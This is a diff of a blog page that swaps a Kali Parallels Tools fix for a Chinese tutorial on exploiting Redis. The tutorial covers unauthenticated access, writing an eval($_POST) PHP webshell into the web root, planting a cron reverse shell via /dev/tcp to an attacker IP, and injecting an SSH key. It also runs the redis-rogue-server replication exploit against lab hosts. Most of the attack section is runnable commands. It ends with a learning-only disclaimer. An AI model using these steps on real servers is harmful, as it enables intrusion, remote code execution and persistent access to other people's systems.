@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="KALI2020.4 安装pd tools 报错解决">
+    <meta name="keywords" content="redis漏洞总结">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>KALI2020.4 安装pd tools 报错解决 | Ex1t</title>
+    <title>redis漏洞总结 | Ex1t</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -241,12 +241,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">KALI2020.4 安装pd tools 报错解决</h1>
+                    <h1 class="description center-align post-title">redis漏洞总结</h1>
                 </div>
             </div>
         </div>
@@ -362,8 +362,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/kali/">
-                                <span class="chip bg-color">kali</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/redis/">
+                                <span class="chip bg-color">redis</span>
                             </a>
                         
                     </div>
@@ -378,7 +382,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-02
+                    2021-07-26
                 </div>
                 
 
@@ -387,14 +391,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    330
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 
@@ -422,17 +426,93 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>不是翻译</p>
-<ol>
-<li> I managed to get Parallels Tools working today on my freshly updated Kali system by following the steps at <a target="_blank" rel="noopener" href="https://kb.parallels.com/123968">https://kb.parallels.com/123968</a> but stopping before running ./install. Then follow the steps:</li>
-<li>Move into the kmods directory, where you should see a file called prl_mod.tar.gz. Extract this archive so we can edit it.<br> 复制文件夹中所有文件到任意目录，进入kmos目录，解压prl_mod.tar.gz。</li>
-<li>Open the file prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c and add the line “#define      segment_eq(a, b) ((a).seg == (b).seg)” to the top.<br> 打开文件<code>prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c</code>将内容<code>#define segment_eq(a, b) ((a).seg == (b).seg)"</code>放到文件开头</li>
-<li>Open the file prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c and add the line “#include &lt;linux/blkdev.h&gt;” to the top.<br>打开文件<code>prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c</code>将内容<code>#include &lt;linux/blkdev.h&gt;</code>放在文件开头</li>
-<li>Open the files prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile and prl_vid/Video/Guest/Linux/kmod/Makefile, and add the line “KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers” to the top.<br>编辑文件<code>prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile</code>和<code>prl_vid/Video/Guest/Linux/kmod/Makefile</code>，将内容<code>KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers</code>添加到文件头</li>
-<li>Re-create the archive with the edited files.<br>使用kmods目录下命令创建压缩包<code>tar tar -zcvf prl_mod.tar.gz .</code></li>
-<li>Now run ./install and it should work.<br>使用管理员运行./install应该可以运行</li>
+                <h2 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h2><p>Redis是一个开源的高性能键值数据库。最热门的NoSq数据库之一，也被人们称为数据结构服务器。</p>
+<p>默认端口：6379</p>
+<p>可能存在的漏洞：未授权访问、主从复制</p>
+<h2 id="二、Redis相关漏洞利用"><a href="#二、Redis相关漏洞利用" class="headerlink" title="二、Redis相关漏洞利用"></a>二、Redis相关漏洞利用</h2><h3 id="2-1、未授权访问"><a href="#2-1、未授权访问" class="headerlink" title="2.1、未授权访问"></a>2.1、未授权访问</h3><h4 id="2-1-1、存在原因"><a href="#2-1-1、存在原因" class="headerlink" title="2.1.1、存在原因"></a>2.1.1、存在原因</h4><p>未设置密码或者设置弱密码</p>
+<pre class="line-numbers language-none"><code class="language-none">bind 127.0.0.1      被注释了，所有机器都可以访问
+protected-mode no  关闭安全模式
+使用root权限 
+等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>（被攻击机器）靶机安装好一个redis后，修改redis.conf后以root权限启动。</p>
+<h4 id="2-1-2、常用命令"><a href="#2-1-2、常用命令" class="headerlink" title="2.1.2、常用命令"></a>2.1.2、常用命令</h4><ol>
+<li>查看信息：<code>info</code> </li>
+<li>删除所有数据库內容：<code>flushable</code> </li>
+<li>刷新数据库：<code>flush</code> </li>
+<li>看所有键：<code>KEYS*</code>，使用 <code>select nun</code>可以查看键值数据。 </li>
+<li>设置变量：<code>set test“who am i</code> </li>
+<li><code>config set dir dirpath</code>设置路径等配置</li>
+<li><code>config get dir/filename</code>获取路径及数据配置信息 </li>
+<li><code>save</code>保存 </li>
+<li><code>get</code>变量，查看变量名称 </li>
+<li>删除Key：<code>DEL KEY_NAME</code></li>
 </ol>
-<p>PS: 亲测可用，如果按照失败，可以重启之后在安装一次</p>
+<h4 id="2-1-3、利用方法"><a href="#2-1-3、利用方法" class="headerlink" title="2.1.3、利用方法"></a>2.1.3、利用方法</h4><p>（1）获取数据库信息</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli -h  <span class="token number">192.168</span>.31.152<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即可成功进入到目标（192.168.31.152）redisl</p>
+<p>查看redis版本相关信息，也判断是否存在密码</p>
+<pre class="line-numbers language-none"><code class="language-none">info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>成功显示信息代表没有密码</p>
+<p> <img src="https://img.ex1t.xyz//1.png" alt="1"></p>
+<p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CONFIG GET <span class="token function">dir</span>         <span class="token comment">#设置目录</span>
+CONFIG GET dbfilename  <span class="token comment">#设置文件名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//2.png" alt="2"></p>
+<p>（2）写webshell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/            <span class="token comment">#切换目录到网站的根目录（根据实际情况来） </span>
+<span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php phpinfo();?&gt;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>   <span class="token comment">#写入恶意代码phpinfo() </span>
+<span class="token builtin class-name">set</span> xx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php @eval(<span class="token variable">$_POST</span>['-7']);?&gt;<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>  <span class="token comment">#写入一句话木马 </span>
+config <span class="token builtin class-name">set</span> dbfilename shell.php                    <span class="token comment">#生成木马文件shell.php </span>
+save                                               <span class="token comment">#进行保存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//3.png" alt="3"></p>
+<p>成功写入到目标机</p>
+<p> <img src="https://img.ex1t.xyz//4.png" alt="4"></p>
+<p>（3）写定时任务反弹shell</p>
+<p>先在自己的服务器上监听一个端口 </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvnp <span class="token number">9999</span>        <span class="token comment">#攻击机监听自己的7999端口 </span>
+redis-cli -h <span class="token number">192.168</span>.31.152 <span class="token comment">#进入对方redis </span>
+<span class="token builtin class-name">set</span>  xx   <span class="token string">"<span class="token entity" title="\n">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.31.116/7999 0&gt;&amp;1<span class="token entity" title="\n">\n</span>"</span> <span class="token comment">#设置变量值为反弹shell语句 </span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/   <span class="token comment">#设置目录为目标机定时任务目录 </span>
+config <span class="token builtin class-name">set</span> dbfilename root        <span class="token comment">#设置文件名 </span>
+save                              <span class="token comment">#保存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//5.png" alt="5"></p>
+<p>写入成功</p>
+<p> <img src="https://img.ex1t.xyz//6.png" alt="6"></p>
+<p>但是一直nc没有接收到</p>
+<p>查了下是因为存在乱码，centos会忽略乱码去执行格式正确的任务计划<br>而ubuntu并不会忽略这些乱码，所以导致命令执行失败<br>推荐可以亲自验证一下</p>
+<p>（4）写入Linux ssh-key公钥，然后通过私钥直接登录。</p>
+<p>攻击机：192.168.31.116</p>
+<p>生成密钥</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//7.png" alt="7"></p>
+<p>将公钥内容导出到文本中</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://img.ex1t.xyz//8.png" alt="8"></p>
+<p>写入目标机器</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> key.txt <span class="token operator">|</span> redis-cli -h <span class="token number">192.168</span>.31.152 -x <span class="token builtin class-name">set</span> xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//9.png" alt="9"></p>
+<p><img src="https://img.ex1t.xyz//10.png" alt="10"></p>
+<p>设置路径、文件名保存，路径根据实际情况来改动</p>
+<p> <img src="https://img.ex1t.xyz//11.png" alt="11"></p>
+<p>写入成功</p>
+<p><img src="https://img.ex1t.xyz//12.png" alt="12"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa <span class="token number">192.168</span>.31.152<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>登录成功</p>
+<p><img src="https://img.ex1t.xyz//13.png" alt="13"></p>
+<h3 id="2-2、主从复制"><a href="#2-2、主从复制" class="headerlink" title="2.2、主从复制"></a>2.2、主从复制</h3><h4 id="2-2-1、漏洞版本"><a href="#2-2-1、漏洞版本" class="headerlink" title="2.2.1、漏洞版本"></a>2.2.1、漏洞版本</h4><p>主从复制存在漏洞的版本</p>
+<p><code>Redis &lt;= 5.0.5</code></p>
+<h4 id="2-2-2、环境部署"><a href="#2-2-2、环境部署" class="headerlink" title="2.2.2、环境部署"></a>2.2.2、环境部署</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker pull damonevking/redis5.0  
+docker run -p <span class="token number">6379</span>:6379 -d damonevking/redis5.0 redis-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//14.png" alt="14"></p>
+<h4 id="2-2-3、攻击原理"><a href="#2-2-3、攻击原理" class="headerlink" title="2.2.3、攻击原理"></a>2.2.3、攻击原理</h4><p>Redis是一个使用ANSIC编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。</p>
+<p>但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。</p>
+<h4 id="2-2-4、利用方式"><a href="#2-2-4、利用方式" class="headerlink" title="2.2.4、利用方式"></a>2.2.4、利用方式</h4><p>利用脚本</p>
+<p><code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
+<p>运行后可直接进行命令执行</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 redis-rogue-server.py --rhost 192.168.31.152 --lhost 192.168.31.146 --exp=exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//15.png" alt="15"></p>
+<p>脚本相关，看github上的脚本介绍即可。</p>
+<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>​    周末写的有些仓促，如果文章中存在什么问题，敬请指正。<br>​    以上仅供学习交流，严禁用于违法途径（手动狗头）。</p>
 
                 
             </div>
@@ -449,7 +529,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">k3vi</a>
+                    <a href="/about" rel="external nofollow noreferrer">诚默</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -459,7 +539,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.ex1t.xyz/2020/12/02/kali2020-4-%E5%AE%89%E8%A3%85pd-tools-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/">https://www.ex1t.xyz/2020/12/02/kali2020-4-%E5%AE%89%E8%A3%85pd-tools-%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</a>
+                    <a href="https://www.ex1t.xyz/2021/07/26/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.ex1t.xyz/2021/07/26/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -472,7 +552,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">k3vi</a>
+                    <a href="/about" target="_blank">诚默</a>
                     !
                 </span>
             </div>
@@ -497,8 +577,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/kali/">
-                                    <span class="chip bg-color">kali</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">漏洞</span>
+                                </a>
+                            
+                                <a href="/tags/redis/">
+                                    <span class="chip bg-color">redis</span>
                                 </a>
                             
                         </div>
@@ -931,17 +1015,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/12/03/cve-2020-1488214883%E5%A4%8D%E7%8E%B0/">
+                <a href="/2021/07/26/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="CVE-2020-1488214883复现">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="redis漏洞总结">
                         
-                        <span class="card-title">CVE-2020-1488214883复现</span>
+                        <span class="card-title">redis漏洞总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -951,9 +1036,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -962,11 +1047,16 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
                     <a href="/tags/%E6%BC%8F%E6%B4%9E/">
                         <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/redis/">
+                        <span class="chip bg-color">redis</span>
                     </a>
                     
                 </div>
@@ -980,13 +1070,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/09/14/%E5%87%A0%E4%B8%AA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">
+                <a href="/2021/03/03/%E4%B8%BB%E6%9C%BA%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="几个渗透工具的简单使用">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Cobalt Strike 主机隐藏教程">
                         
-                        <span class="card-title">几个渗透工具的简单使用</span>
+                        <span class="card-title">Cobalt Strike 主机隐藏教程</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -997,12 +1087,12 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-03
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            诚默
+                            k3vi
                             
                         </span>
                     </div>
@@ -1010,8 +1100,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
-                        <span class="chip bg-color">工具</span>
+                    <a href="/tags/cobaltstrike/">
+                        <span class="chip bg-color">cobaltstrike</span>
                     </a>
                     
                 </div>
